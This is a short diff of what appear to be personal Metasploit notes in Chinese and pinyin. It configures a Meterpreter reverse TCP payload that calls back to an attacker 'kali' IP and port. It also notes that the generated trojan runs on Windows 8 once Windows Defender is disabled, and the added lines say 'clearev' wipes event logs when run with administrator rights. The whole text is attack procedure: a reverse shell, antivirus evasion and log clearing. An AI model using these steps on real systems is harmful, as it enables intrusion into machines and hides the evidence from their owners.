@@ -49,4 +49,5 @@ set payload windows/x64/meterpreter/reverse_tcp
 set lhost 192.168.55.201                 kali  ip 地址
 set lport 50000                          
 run
-win8 能运行生产的木马 关了 windows defender jiu行
+win8 能运行生产的木马 关了 windows defender jiu行  clearev meiquanxian
+guanliyuan quanxian yunxing keyi clearev le
